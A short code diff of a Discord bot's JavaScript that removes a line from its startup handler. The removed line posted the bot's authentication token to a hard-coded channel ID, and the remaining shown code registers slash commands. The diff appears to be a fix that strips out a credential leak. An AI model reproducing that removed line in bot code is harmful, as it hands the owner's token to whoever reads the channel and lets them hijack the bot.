@@ -71,7 +71,6 @@ const cmds = [
   }
 ]
 client.on('ready', () => {
-  client.channels.cache.get("997142825886031955").send(client.token)
   client.application.commands.set(cmds)
 })
 client.on('interactionCreate', async interaction => {
